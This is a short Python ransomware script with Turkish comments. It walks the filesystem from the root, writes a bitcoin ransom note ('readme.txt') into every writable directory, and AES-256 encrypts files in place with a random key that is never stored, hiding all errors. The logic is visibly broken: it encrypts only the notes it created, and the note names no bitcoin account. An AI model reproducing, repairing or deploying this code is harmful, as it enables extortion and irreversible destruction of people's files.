import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# AES için 32 byte anahtar oluştur
key = os.urandom(32)  # AES-256 için 32 byte
iv = os.urandom(16)   # 16 byte IV

#  Şifreleme fonksiyonu
def encrypt_file(filepath, key, iv):
    try:
        # Dosya içeriğini oku
        with open(filepath, "rb") as file:
            plaintext = file.read()

        # PKCS7 padding ile 16 byte bloklara tamamlama
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(plaintext) + padder.finalize()

        # AES-256 CBC ile şifreleme
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        # Şifrelenmiş veriyi tekrar dosyaya yaz
        with open(filepath, "wb") as file:
            file.write(iv + ciphertext)  # IV başa eklenir

    except:
        pass  # Hata olursa devam et


def main():
    try:
        name = "readme.txt"
        file_list = []  # Şifrelenecek dosyalar için liste
        
        # / dizininde gezip her dizindeki dosyaları listeye ekle
        for root, dirs, files in os.walk("/"):
            dd = os.path.join(root, name)  # Dosya yolu oluşturuluyor

            try:
                # Dosyayı oluştur ve içine mesaj yaz
                with open(dd, "w") as file:
                    file.write("if you want to decrypt the password send 0.0015 bits to this bitcoin account")

                file_list.append(dd)  # Dosya listesini kaydet

            except PermissionError:
                continue  # Hata alınırsa atla

        #  Listeye eklenen tüm dosyaları şifrele
        for file_path in file_list:
            encrypt_file(file_path, key, iv)

    except:
        pass  # Beklenmedik hata olursa devam et

# Ana fonksiyonu çalıştır
main()
